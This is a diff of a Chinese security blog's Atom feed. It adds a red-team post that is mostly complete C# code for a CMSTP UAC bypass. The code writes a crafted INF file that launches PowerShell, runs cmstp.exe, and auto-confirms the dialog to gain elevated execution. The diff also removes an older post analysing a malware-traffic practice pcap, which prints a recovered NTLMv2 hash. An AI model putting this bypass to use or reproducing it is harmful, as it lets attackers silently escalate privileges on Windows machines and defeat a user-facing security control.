@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-02-22T12:04:03.079Z</updated>
+  <updated>2021-03-04T13:06:33.470Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>cmstp bypassuac研究</title>
+    <link href="http://422926799.github.io/posts/d38c8377.html"/>
+    <id>http://422926799.github.io/posts/d38c8377.html</id>
+    <published>2021-03-04T12:58:58.000Z</published>
+    <updated>2021-03-04T13:06:33.470Z</updated>
+    
+    <content type="html"><![CDATA[<p>参考链接:<br><a href="https://www.anquanke.com/post/id/86685" target="_blank" rel="noopener">https://www.anquanke.com/post/id/86685</a><br><a href="https://mp.weixin.qq.com/s/dhh73wWhbo_dfYN-oBDW6g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/dhh73wWhbo_dfYN-oBDW6g</a></p><p>对应的powershell脚本:</p><p><a href="https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1" target="_blank" rel="noopener">https://gist.github.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1#file-uacbypasscmstp-ps1</a></p><p>测试系统：</p><pre><code>* windows 10* windows 7* windows server 2012* windows server 2008</code></pre><p>C#改造</p><pre><code class="C#">using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;using System.Diagnostics;using System.Runtime.InteropServices;using System.Windows.Forms;using System.IO;using System.Threading.Tasks;namespace cmstp_bypassuac{    class Program    {        [DllImport(&quot;user32.dll&quot;, SetLastError = true)]        public static extern bool SetForegroundWindow(IntPtr hWnd);        public static string createinf() {            string filename = &quot;test.inf&quot;;            string command = @&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;;            string data = @&quot;[version]Signature=$chicago$AdvancedINF=2.5[DefaultInstall]CustomDestination=CustInstDestSectionAllUsersRunPreSetupCommands=RunPreSetupCommandsSection[RunPreSetupCommandsSection]; Commands Here will be run Before Setup Begins to install{0}taskkill /IM cmstp.exe /F[CustInstDestSectionAllUsers]49000,49001=AllUSer_LDIDSection, 7[AllUSer_LDIDSection]&quot;&quot;HKLM&quot;&quot;, &quot;&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&quot;&quot;,  &quot;&quot;ProfileInstallPath&quot;&quot;, &quot;&quot; % UnexpectedError % &quot;&quot;, &quot;&quot;&quot;&quot;    [Strings]ServiceName = &quot;&quot;CorpVPN&quot;&quot;ShortSvcName = &quot;&quot;CorpVPN&quot;;            data = string.Format(data, command);            File.WriteAllText(filename, data);            if (File.Exists(filename))            {                Console.WriteLine(&quot;Create Inf File is ok&quot;);                var currentpath = System.IO.Directory.GetCurrentDirectory() +  &quot;\\&quot;+filename;                return currentpath;            }            else {                Console.WriteLine(&quot;Create Inf File Failure...&quot;);                return &quot;&quot;;            }        }        public static IntPtr execute() {            Process[] cmstpdata = Process.GetProcessesByName(&quot;cmstp&quot;); //获取CMSTP线程            if (cmstpdata.Length != 0)            {                cmstpdata[0].Refresh();                var windowhandle = cmstpdata[0].MainWindowHandle;                return windowhandle;            }            else            {                Console.WriteLine(&quot;Not Found cmstp handle,exit....&quot;);                return IntPtr.Zero;            }        }        static void Main(string[] args)        {            string infpath=createinf();            if (infpath.Length != 0)            {                ProcessStartInfo runcmd =new  ProcessStartInfo(&quot;C:\\Windows\\System32\\cmstp.exe&quot;);                runcmd.Arguments = &quot;/au \&quot;&quot;+infpath+&quot;\&quot;&quot;;                runcmd.UseShellExecute = false;                Process.Start(runcmd);                IntPtr windowhandle = execute();                //由于刚刚cmstp进程刚刚创建无法快速获取对应的窗口句柄，使用循环来解决                while (windowhandle == IntPtr.Zero) {                    windowhandle = execute();                }                Console.WriteLine(&quot;The Cmstp Handle:&quot; + windowhandle);                SetForegroundWindow(windowhandle); //将CMSTP窗口调出到前台并激活该窗口                SendKeys.SendWait(&quot;{ENTER}&quot;);                }        }       }}</code></pre><p>效果如下<br><img src="https://s3.ax1x.com/2021/03/04/6Zt5kj.gif" alt=""></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;参考链接:&lt;br&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/86685&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/86685&lt;/a&gt;&lt;br&gt;&lt;a</summary>
+      
+    
+    
+    
+    
+    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
+    
+  </entry>
   
   <entry>
     <title>PEB的深入学习</title>
@@ -439,28 +461,6 @@
       
       
     <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在freebuf上看到一篇名为：&lt;a href=&quot;https://www.freebuf.com/articles/web/257752.h</summary>
-      
-    
-    
-    
-    
-    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>malware-traffic恶意流量包分析笔记</title>
-    <link href="http://422926799.github.io/posts/daac1c3c.html"/>
-    <id>http://422926799.github.io/posts/daac1c3c.html</id>
-    <published>2020-12-14T16:29:00.000Z</published>
-    <updated>2020-12-14T17:56:11.178Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>(中间停更过一段时间博客，因为懒都发星球去了。现在打算继续写)<br>翻到之前收藏的恶意流量分析练习的pcap地址，下载一个来弄弄<br><a href="https://www.malware-traffic-analysis.net/" target="_blank" rel="noopener">https://www.malware-traffic-analysis.net/</a><br>解压密码:infected<br><img src="https://s3.ax1x.com/2020/12/15/ru7id0.png" alt=""></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>wireshark打开后，我比较喜欢先统计一下所有的IP，和包里有什么协议，还有注意一下导出分组里的内容。<br>导出对象<br><img src="https://s3.ax1x.com/2020/12/15/ru7mQJ.png" alt=""><br>IP统计<br><img src="https://s3.ax1x.com/2020/12/15/ru7wwt.png" alt=""><br>协议分级<br><img src="https://s3.ax1x.com/2020/12/15/ru7ny9.png" alt=""></p><p>从上图可以得到以下几点信息：</p><ul><li>存在HTTP、SMB、LDAP、DNS流量</li><li>SMB和LDAP流量占多</li><li>源IP访问的目标IP端口</li></ul><p>看了一下HTTP流量，发现是下载了三个文件<br><img src="https://s3.ax1x.com/2020/12/15/ruHA0I.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruHZAP.png" alt=""></p><p>尝试过提取出来，发现并不行。失败了，将pcap上传到<a href="https://pcap.zhouhe.360.cn/发现VT上有样本" target="_blank" rel="noopener">https://pcap.zhouhe.360.cn/发现VT上有样本</a><br><img src="https://s3.ax1x.com/2020/12/15/ruL2CV.png" alt=""></p><p>三个都免杀，但是看了一下VT的检测结果。发现没有任何外连(不排除判断是否在虚拟机里运行，是的话直接ExitProcess)<br>查询结果：<a href="https://pcap.zhouhe.360.cn/saas/results/?uid=481b567aaed8f4edc751d2ae7077cabf&amp;name=rawLog" target="_blank" rel="noopener">https://pcap.zhouhe.360.cn/saas/results/?uid=481b567aaed8f4edc751d2ae7077cabf&amp;name=rawLog</a><br><img src="https://s3.ax1x.com/2020/12/15/ruLfvF.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruL4u4.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruL5DJ.png" alt=""></p><p>HTTP流量到这里貌似也没啥好追的了，看了一眼TLS也没啥异样<br><img src="https://s3.ax1x.com/2020/12/15/ruLH4x.png" alt=""></p><p>然后把目光转向smb，发现存在个域。使用Kerberos TGT访问的域控<br><img src="https://s3.ax1x.com/2020/12/15/ruLXvD.png" alt=""><br><img src="https://s3.ax1x.com/2020/12/15/ruLOgO.png" alt=""></p><p>看了一下成功认证smb后访问过的文件和文件夹，也没有干啥<br><img src="https://s3.ax1x.com/2020/12/15/ruOpVA.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruOC5t.png" alt=""></p><p>后面用NTLMRawUnHide从数据包里提取出了一个NTLM<br><img src="https://s3.ax1x.com/2020/12/15/ruOF8f.png" alt=""></p><p>至此信息如下：</p><pre><code>HTTP------------domain:t497sword.com - 5.44.3.72 4- 俄罗斯莫斯科download.windowsupdate.com - 72.21.81.240 - 美国ctldl.windowsupdate.com -67.24.185.254 - 美国SMB-------------\\MRNATURAL.INFO\IPC$\\MrNatural-DC.mrnatural.info\IPC$info--------------10.12.1.101 hostname:Lenovo_2b Mac:10:c5:95:2b:13:0510.12.1.2 hostname:Dell_99 Mac:00:11:43:99:de:87[1;37mFound NTLMSSP Message Type 3 :[1;32m Authentication[0;37m    [1;34m&gt;[1;37m Domain                 :[0;97m MRNATURAL [0;37m    [1;34m&gt;[1;37m Username               :[0;97m fabulous.dale [0;37m    [1;34m&gt;[1;37m Workstation            :[0;97m DESKTOP-NATURAL [0;37m[1;37mNTLMv2 Hash recovered:[0;97mMRNATURAL\fabulous.dale::DESKTOP-NATURAL:100dd7adfc69d6a4:2a6c2ec69501afb83ce01d54e115314f:0101000000000000d0521c723bc8d601e8b8829daacf831700000000020012004d0052004e00410054005500520041004c00010018004d0052004e00410054005500520041004c002d004400430004001c006d0072006e00610074007500720061006c002e0069006e0066006f00030036004d0072004e00610074007500720061006c002d00440043002e006d0072006e00610074007500720061006c002e0069006e0066006f0005001c006d0072006e00610074007500720061006c002e0069006e0066006f0007000800d0521c723bc8d60106000400020000000800300030000000000000000000000000200000764598ededc17516e4c2b0bf2070ee5ff48e1dbf474b9cf30823f0967cb02e2e0a001000000000000000000000000000000000000900260063006900660073002f004d0052004e00410054005500520041004c002e0049004e0046004f000000000000000000</code></pre><p>后面追踪主机名，看到LDAP查询的内容</p><pre><code>&quot;DC=mrnatural,DC=info&quot;&quot;CN=DESKTOP-NATURAL,CN=Computers,DC=mrnatural,DC=info&quot;&quot;CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=mrnatural,DC=info&quot;&quot;cn=policies,cn=system,DC=mrnatural,DC=info&quot;&quot;CN=DESKTOP-NATURAL,CN=Computers,DC=mrnatural,DC=info&quot;</code></pre><p><img src="https://s3.ax1x.com/2020/12/15/ruOZrQ.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruOebj.png" alt=""></p><p>后面对着每个IP都检查了一下，发现可疑也就http流量的那三个。其他都无异样，后面去微步社区查了一下找到了以下信息<br><img src="https://s3.ax1x.com/2020/12/15/ruOQP0.png" alt=""></p><p><img src="https://s3.ax1x.com/2020/12/15/ruO12T.png" alt=""><br><img src="https://s3.ax1x.com/2020/12/15/ruOlGV.png" alt=""></p><p>至此也没什么好弄的，，，可能还有一些别的没发现吧。太菜了<br>以下微步社区和分析的链接：<br><a href="https://x.threatbook.cn/nodev4/ip/72.21.81.240" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/ip/72.21.81.240</a><br><a href="https://x.threatbook.cn/nodev4/ip/67.24.185.254" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/ip/67.24.185.254</a><br><a href="https://blog.talosintelligence.com/2020/07/threat-roundup-0710-0717.html" target="_blank" rel="noopener">https://blog.talosintelligence.com/2020/07/threat-roundup-0710-0717.html</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;(中间停更过一段时间博客，因为懒都发星球去了。现在打算继续写)&lt;br&gt;翻到之前收藏的恶意流量分析练习的pcap地址，下载一个来弄弄&lt;br&gt;&lt;</summary>
       
     
     
